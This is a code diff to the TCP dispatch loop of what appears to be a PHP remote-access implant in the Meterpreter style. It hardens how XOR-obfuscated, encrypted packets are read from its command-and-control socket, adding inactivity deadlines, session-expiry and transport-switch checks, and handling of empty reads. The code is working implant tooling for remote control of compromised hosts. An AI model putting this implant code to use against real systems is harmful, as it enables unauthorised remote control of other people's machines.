@@ -1609,15 +1609,34 @@ function dispatch_tcp(&$transport) {
         $header = xor_bytes($xor, substr($packet, 4, 28));
         $len_array = unpack("Nlen", substr($header, 20, 4));
         $len = $len_array['len'] + 32 - 8;
+        $chunk_deadline = time() + $transport['comm_timeout'];
         while (strlen($packet) < $len) {
-          $chunk = read($msgsock, $len - strlen($packet));
-          if ($chunk === false || $chunk === '') {
-            # The C2 socket closed mid-packet; the partial packet is
-            # unprocessable so retire rather than attempt a corrupt response.
+          if (time() > $chunk_deadline
+              || empty($GLOBALS['running'])
+              || time() > $GLOBALS['session_expiry_end']
+              || $GLOBALS['next_transport_idx'] !== null) {
             remove_reader($msgsock); close($msgsock);
             return DISPATCH_RETIRE;
           }
+          $chunk = read($msgsock, $len - strlen($packet));
+          if ($chunk === false) {
+            # false means the C2 socket closed mid-packet ('' is a normal empty read
+            # between TCP segments and must not retire the transport).
+            remove_reader($msgsock); close($msgsock);
+            return DISPATCH_RETIRE;
+          }
+          if ($chunk === '') {
+            # No data ready yet between TCP segments; yield briefly to reduce
+            # CPU spinning. Note: this does not return control to the outer
+            # select() — channel fairness during a C2 packet gap requires
+            # resumable packet assembly (tracked as a follow-up).
+            usleep(1000);
+            continue;
+          }
           $packet .= $chunk;
+          # Refresh deadline on each successful chunk: comm_timeout limits
+          # inactivity, not total transfer time.
+          $chunk_deadline = time() + $transport['comm_timeout'];
         }
         $response = create_response(decrypt_packet(xor_bytes($xor, $packet)));
         write_tlv_to_socket($msgsock, $response);
